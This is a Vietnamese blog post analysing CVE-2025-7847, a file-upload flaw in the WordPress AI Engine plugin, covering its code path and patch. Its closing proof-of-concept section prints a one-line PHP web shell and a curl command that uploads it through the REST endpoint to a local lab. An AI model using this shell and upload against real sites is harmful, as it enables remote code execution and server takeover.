---
title: CVE-2025-7847 Analysis & POC
description: Security Vulnerability in WordPress AI Engine Plugin.
date: 2025-11-13 19:00:00 +0700
categories: [CVE Analyst]
tags: [analyst, plugin, arbitrary file upload]
images: ["app.png"]
featuredImage: "app.png"

lightgallery: true

toc:
  auto: false
---

<!--more-->

## CVE & Basic Info
Plugin **AI Engine** cho **WordPress** tồn tại lỗ hổng **arbitrary file upload** do thiếu **file type validation** trong hàm `rest_simpleFileUpload()` ở các phiên bản **2.9.3** và **2.9.4**.
Điều này cho phép **authenticated attackers** (những kẻ tấn công đã xác thực), với quyền **Subscriber-level** trở lên, có thể **upload arbitrary files** lên **server** của trang web bị ảnh hưởng khi **REST API** được bật, từ đó có thể dẫn đến **remote code execution (RCE)**.

* **CVE ID**: [CVE-2025-7847](https://www.cve.org/CVERecord?id=CVE-2025-7847)
* **Vulnerability Type**: Arbitrary File Upload
* **Affected Versions**: 2.9.3-2.9.4
* **Patched Versions**: 2.9.5
* **CVSS severity**: High (9.9)
* **Required Privilege**: Subscriber
* **Product**: [WordPress AI Engine Plugin](https://wordpress.org/plugins/ai-engine/)

## Requirements

* **Local WordPress & Debugging**
    * [Virtual Machine](https://w41bu1.github.io/posts/2025-08-21-wordpress-local-and-debugging/)
    * [Docker](https://w41bu1.github.io/posts/2025-10-22-wordpress-local-and-debugging-docker/)
* **Plugin Version** - **AI Engine**:  
    * `2.9.4` – **vulnerable**  
    * `2.9.5` – **patched**
* **Diff Tool (diff)** → [**Meld**](https://meldmerge.org/) hoặc bất kỳ công cụ diff nào.

## Cause
Lỗ hổng xảy ra do hàm xử lý upload cho phép ghi file trực tiếp (`copy()`, `file_put_contents()`) mà **không kiểm tra loại file hoặc xác thực người dùng**, nên attacker có thể **upload file tùy ý (kể cả `.php`)** vào thư mục uploads và thực thi mã độc.

![Validate File Type](diff.png "Xác thực file type")

```php
// Validate filename extension for base64 uploads
$validate = wp_check_filetype( $filename );
if ( $validate['type'] == false ) {
  throw new Exception( 'File type is not allowed.' );
}
```

Bản vá đã thêm kiểm tra loại tệp trong hàm `simpleFileUpload` và `upload_file` bằng `wp_check_filetype()` để chỉ cho phép upload các định dạng hợp lệ dựa trên whilelist của WordPress

## Code Analysis
Plugin đã đăng ký một số Public API thông quan hàm `rest_api_init()`

```php {data-open=true title="api.php" hl_lines=[3,8,12,14]}
public function rest_api_init() {
  $public_api = $this->core->get_option( 'public_api' );
  if ( !$public_api ) {
    return;
  }
  $this->bearer_token = $this->core->get_option( 'public_api_bearer_token' );
  if ( !empty( $this->bearer_token ) ) {
    add_filter( 'mwai_allow_public_api', [ $this, 'auth_via_bearer_token' ], 10, 3 );
  }
  register_rest_route( 'mwai/v1', '/simpleFileUpload', [
    'methods' => 'POST',
    'callback' => [ $this, 'rest_simpleFileUpload' ],
    'permission_callback' => function ( $request ) {
      return $this->core->can_access_public_api( 'simpleFileUpload', $request );
    },
  ] );
  ...
}
```

Hàm sẽ kiểm tra option **Public API** đã được bật hay chưa. Theo [document](https://ai.thehiddendocs.com/public-rest-api/) của plugin, mặc định option này sẽ không được bật:

> By default, the Public REST API is disabled completely. If you enable it, only authentified API requests will actually go through, otherwise they will be rejected. You can override this behavior in many ways and we will see a few examples. The Public REST API is also limited by the Limits set in AI Engine (either as Users or Guests, and System).

Bạn có thể bặt ở nó Admin Dashboard tại `wp-admin/admin.php?page=mwai_settings&nekoTab=settings`

![enable the REST API](https://ai.thehiddendocs.com/wp-content/uploads/sites/2/2025/07/image-8.png "enable the REST API")

Theo mô tả, khi bật option này lên, chỉ những `authentified API requests` mới được thông qua. Có 2 cách để xác thực:
* `X-WP-Nonce`: Lấy thông qua JavaScript Object `wpApiSettings` dành cho người dùng đã đăng nhập (Subcriber+)
* `Bearer Token`: Do admin cấu hình

```php {data-open=true title="api.php" hl_lines=[]}
$this->bearer_token = $this->core->get_option( 'public_api_bearer_token' );
if ( !empty( $this->bearer_token ) ) {
  add_filter( 'mwai_allow_public_api', [ $this, 'auth_via_bearer_token' ], 10, 3 );
}
```

Khi Bearer Token được set,plugin sẽ **đăng ký một filter** có tên `mwai_allow_public_api`,
với **callback** là phương thức `auth_via_bearer_token`.

```php
register_rest_route( 'mwai/v1', '/simpleFileUpload', [
  'methods' => 'POST',
  'callback' => [ $this, 'rest_simpleFileUpload' ],
  'permission_callback' => function ( $request ) {
    return $this->core->can_access_public_api( 'simpleFileUpload', $request );
  },
] );
```

Một api được đăng ký với method POST:
* Endpoint: `/wp-json/mwai/v1/simpleFileUpload`
* Callback: `rest_simpleFileUpload`

Với `permission_callback` là kết quả trả về của `can_access_public_api()`

```php {data-open=true title="core.php" hl_lines=[]}
public function can_access_public_api( $feature, $extra ) {
  $logged_in = is_user_logged_in();
  return apply_filters( 'mwai_allow_public_api', $logged_in, $feature, $extra );
}
```

Trong WP REST API, hàm `is_user_logged_in()` sẽ trả về:
* `true`: Nếu người dùng đã đăng nhập và header **X-WP-Nonce** hợp lệ
* `false`: Nếu người dùng chưa đăng nhập hoặc header **X-WP-Nonce** không hợp lệ 

`can_access_public_api` sẽ gọi đến filter `mwai_allow_public_api` được đăng ký ở trên => `auth_via_bearer_token($logged_in, $feature, $extra)` được gọi 

```php {data-open=true title="api.php" hl_lines=[]}
public function auth_via_bearer_token( $allow, $feature, $extra ) {
  if ( !empty( $extra ) && !empty( $extra->get_header( 'Authorization' ) ) ) {
    $token = $extra->get_header( 'Authorization' );
    $token = str_replace( 'Bearer ', '', $token );
    if ( $token === $this->bearer_token ) {
      // We set the current user to the first admin.
      $admin = $this->core->get_admin_user();
      wp_set_current_user( $admin->ID, $admin->user_login );
      return true;
    }
  }
  return $allow;
}
```

Hàm `auth_via_bearer_token()` dùng để xác thực bằng Bearer Token.
Quy trình của nó:

* Nếu request có header `Authorization` chứa chuỗi `Bearer <token>`
  và giá trị `<token>` trùng với token được lưu trong tùy chọn (`$this->bearer_token`), thì:

  * Gán người dùng hiện tại thành admin đầu tiên (`wp_set_current_user()`),
  * Trả về `true` → cho phép truy cập API.

* Nếu không có hoặc token sai → trả về `$allow`,
  tức là kết quả kiểm tra ban đầu từ `is_user_logged_in()`.

> [!INFO]
> Mặc định, ta sẽ không có **Bearer Token** để xác thực, nên ta cần dựa vào **X-WP-Nonce** hợp lệ của Subcriber user => `permission_callback=true`

---

```php {data-open=true title="api.php" hl_lines=[10,28]}
public function rest_simpleFileUpload( $request ) {
  try {
    $params = $request->get_params();
    $files = $request->get_file_params();
    
    // Check if file is provided
    if ( empty( $files['file'] ) ) {
      // Check for base64 encoded file data
      ...
      $result = $this->simpleFileUpload( null, $base64, $filename, $purpose, $ttl, $target, $metadata );
    }
    else {
      // Handle regular file upload
      $file = $files['file'];
      $purpose = isset( $params['purpose'] ) ? $params['purpose'] : 'files';
      $ttl = isset( $params['ttl'] ) ? intval( $params['ttl'] ) : 3600;
      $target = isset( $params['target'] ) ? $params['target'] : null;
      $metadata = isset( $params['metadata'] ) ? $params['metadata'] : [];
      
      if ( $this->debug ) {
        $debug = sprintf( 'REST [SimpleFileUpload]: file upload, name=%s, purpose=%s', 
          $file['name'], 
          $purpose 
        );
        Meow_MWAI_Logging::log( $debug );
      }
      
      $result = $this->simpleFileUpload( $file, null, null, $purpose, $ttl, $target, $metadata );
    }
    
    return new WP_REST_Response( [ 'success' => true, 'data' => $result ], 200 );
  }
  catch ( Exception $e ) {
    return new WP_REST_Response( [ 'success' => false, 'message' => $e->getMessage() ], 500 );
  }
}
```

Hàm `rest_simpleFileUpload()` xử lý upload file qua REST API.

* Lấy tham số và file từ `$request`.
* Nếu không có file, kiểm tra dữ liệu base64 và gọi `$this->simpleFileUpload()`.
* Nếu có file, lấy các tham số tùy chọn (`purpose`, `ttl`, `target`, `metadata`), ghi log nếu debug, rồi gọi `$this->simpleFileUpload()`.
* Trả về `WP_REST_Response` với `success => true` và dữ liệu file, hoặc `success => false` nếu có lỗi.

```php {data-open=true title="api.php" hl_lines=[13]}
public function simpleFileUpload( $file = null, $base64 = null, $filename = null, $purpose = 'files', $ttl = 3600, $target = null, $metadata = [] ) {
  ...
  try {
    if ( !empty( $base64 ) ) {
     ...
    }
    else if ( !empty( $file ) && is_array( $file ) ) {
      // Handle regular file upload
      if ( !empty( $file['error'] ) ) {
        throw new Exception( 'File upload error: ' . $file['error'] );
      }
      
      $refId = $this->core->files->upload_file(
        $file['tmp_name'],
        $file['name'],
        $purpose,
        $metadata,
        null, // envId
        $target,
        $ttl
      );
      
      $url = $this->core->files->get_url( $refId );
      
      return [
        'id' => $refId,
        'url' => $url
      ];
    }
    else {
      throw new Exception( 'Either a file or base64 data must be provided.' );
    }
  }
  catch ( Exception $e ) {
    throw new Exception( 'File upload failed: ' . $e->getMessage() );
  }
}
```

Hàm `simpleFileUpload()` thực hiện upload file hoặc dữ liệu base64.

* Nếu `$base64` không rỗng → xử lý upload từ base64.
* Nếu `$file` là mảng hợp lệ:

  * Kiểm tra lỗi upload (`$file['error']`) → ném Exception nếu có lỗi.
  * Gọi `$this->core->files->upload_file()` để lưu file.
  * Lấy URL file qua `$this->core->files->get_url($refId)` và trả về mảng `['id' => $refId, 'url' => $url]`.

```php
public function upload_file($path,$filename = null,$purpose = null,$metadata = null,$envId = null,$target = null,$expiry = null) {
  require_once( ABSPATH . 'wp-admin/includes/image.php' );
  require_once( ABSPATH . 'wp-admin/includes/file.php' );
  require_once( ABSPATH . 'wp-admin/includes/media.php' );

  $target = empty( $target ) ? $this->core->get_option( 'image_local_upload' ) : $target;
  $expiry = empty( $expiry ) ? $this->core->get_option( 'image_expires' ) : $expiry;

  $expires = ( $expiry === 'never' || empty( $expiry ) ) ? null : date( 'Y-m-d H:i:s', time() + intval( $expiry ) );
  $refId = $this->generate_refId();
  $url = null;
  if ( empty( $filename ) ) {
    $parsed_url = parse_url( $path, PHP_URL_PATH );
    $filename = basename( $parsed_url );
    $extension = pathinfo( $filename, PATHINFO_EXTENSION );
  }
  else {
    $extension = pathinfo( $filename, PATHINFO_EXTENSION );
  }
  $newFilename = $refId . '.' . $extension;
  $unique_filename = wp_unique_filename( wp_upload_dir()['path'], $newFilename );
  $destination = wp_upload_dir()['path'] . '/' . $unique_filename;

  if ( $target === 'uploads' ) {
    if ( !$this->check_db() ) {
      throw new Exception( 'Could not create database table.' );
    }
    if ( !copy( $path, $destination ) ) {
      throw new Exception( 'Could not move the file.' );
    }
    $url = wp_upload_dir()['url'] . '/' . $unique_filename;

    $now = date( 'Y-m-d H:i:s' );
    $fileId = $this->commit_file( [
      'refId' => $refId,
      'envId' => $envId,
      'purpose' => $purpose,
      'type' => null,
      'status' => 'uploaded',
      'created' => $now,
      'updated' => $now,
      'expires' => $expires,
      'path' => $destination,
      'url' => $url
    ] );
    if ( $metadata && is_array( $metadata ) ) {
      foreach ( $metadata as $metaKey => $metaValue ) {
        $this->add_metadata( $fileId, $metaKey, $metaValue );
      }
    }

  }
  else if ( $target === 'library' ) {

    if ( filter_var( $path, FILTER_VALIDATE_URL ) ) {
      $tmp = download_url( $path );
      if ( is_wp_error( $tmp ) ) {
        throw new Exception( $tmp->get_error_message() );
      }
      $file_array = [ 'name' => $unique_filename, 'tmp_name' => $tmp ];
    }
    else {
      $file_array = [ 'name' => $unique_filename, 'tmp_name' => $path ];
    }

    $id = media_handle_sideload( $file_array, 0 );
    if ( is_wp_error( $id ) ) {
      throw new Exception( $id->get_error_message() );
    }

    $url = wp_get_attachment_url( $id );
    update_post_meta( $id, '_mwai_file_id', $refId );
    update_post_meta( $id, '_mwai_file_expires', $expires );

    // Store additional metadata
    if ( $metadata && is_array( $metadata ) ) {
      foreach ( $metadata as $metaKey => $metaValue ) {
        update_post_meta( $id, '_mwai_' . $metaKey, $metaValue );
      }
    }

    // Store purpose and envId as post meta
    if ( $purpose ) {
      update_post_meta( $id, '_mwai_purpose', $purpose );
    }
    if ( $envId ) {
      update_post_meta( $id, '_mwai_envId', $envId );
    }
  }

  return $refId;
}
```

Hàm `upload_file()` xử lý upload file và đặt tên file như sau:

* Xác định tên và phần mở rộng: nếu `$filename` không cung cấp, lấy tên file từ `$path` và giữ phần mở rộng để đúng định dạng.
* Tạo tên file duy nhất bằng cách ghép `$refId` với phần mở rộng, rồi dùng `wp_unique_filename()` để tránh trùng tên trong thư mục lưu trữ.
* Lưu file: nếu `$target === 'uploads'` thì copy vào thư mục uploads, nếu `$target === 'library'` thì thêm vào Media Library bằng `media_handle_sideload()`.
* Trả về `$refId`. File được lưu với tên `<refId>.<extension>` trong thư mục uploads hoặc Media Library, kèm metadata nếu có.

## Flow

{{< mermaid >}}
graph TD
A["POST /wp-json/mwai/v1/simpleFileUpload"] --> B{"permission_callback"}
B -- Authenticated (X-WP-Nonce or Bearer) --> C["rest_simpleFileUpload()"]
C --> D["simpleFileUpload()"]
D --> E["files->upload_file(tmp_name, name, target, ...)"]
E --> F["Determine extension → newFilename = refId.extension"]
F --> G{"target === 'uploads' ?"}
G -- Yes --> H["copy(path, destination) → file placed in uploads"]
H --> I{"No filetype validation"}
I -- Yes --> J["Uploaded .php accessible via URL"]
J --> L["Response contain URL to file"]
L --> K["Execute PHP → Remote Code Execution (RCE)"]
{{< /mermaid >}}

## Proof of Concept (PoC)
1. Tạo web shell 

```php
<?php system($_REQUEST["cmd"]); ?>
```

2. Upload web shell

```sh
curl -X POST \
  "http://localhost/wp-json/mwai/v1/simpleFileUpload" \
  -H "X-WP-Nonce: 51e6c4a45a" \
  -F "file=@rce.php" \
  -b "wp-settings-time-1=1762427921;
      wp-settings-1=libraryContent%3Dbrowse%26editor%3Dtinymce;
      wordpress_test_cookie=WP%20Cookie%20check;
      PHPSESSID=9d30c6b076551e37fb4ed7968fd5de98;
      wp_lang=en_US;
      wordpress_logged_in_86a9106ae65537651a8e456835b316ab=sub%7C1762706307%7C3gOEpWVViHcurttDwNTWxn1b5CWvZGdOajkR5cjzW3e%7Cda0f415f7f042d4095dbeac711e1742cc23db9ea1d020adbae5c385a36b65b98;
      wp-settings-5=mfold%3Do;
      wp-settings-time-5=1762533510" \
  --proxy 127.0.0.1:8080 # Burp proxy
```

![Upload](upload.png "Upload file thành công")

3. RCE với web shell

![Result](result.png "RCE với file upload")

# Conclusion

CVE-2025-7847 là lỗ hổng **arbitrary file upload** nghiêm trọng trong plugin **AI Engine 2.9.3–2.9.4**, cho phép user đã xác thực (Subscriber+) upload file bất kỳ lên server qua REST API, dẫn tới **RCE**. Bản vá 2.9.5 khắc phục bằng kiểm tra loại file (`wp_check_filetype`).

# Key Takeaways

* Lỗ hổng chỉ ảnh hưởng khi **REST API Public bật** và user có **X-WP-Nonce hợp lệ** hoặc Bearer token.
* Nguyên nhân: **thiếu kiểm tra loại file** và copy file trực tiếp vào uploads.
* Giải pháp: **cập nhật plugin lên 2.9.5**.

## References

[Arbitrary File Upload](https://book.hacktricks.wiki/en/pentesting-web/file-upload/index.html)

[WordPress AI Engine Plugin 2.9.3-2.9.4 is vulnerable to Arbitrary File Upload](https://patchstack.com/database/wordpress/plugin/ai-engine/vulnerability/wordpress-ai-engine-plugin-2-9-3-2-9-4-authenticated-subscriber-arbitrary-file-upload)  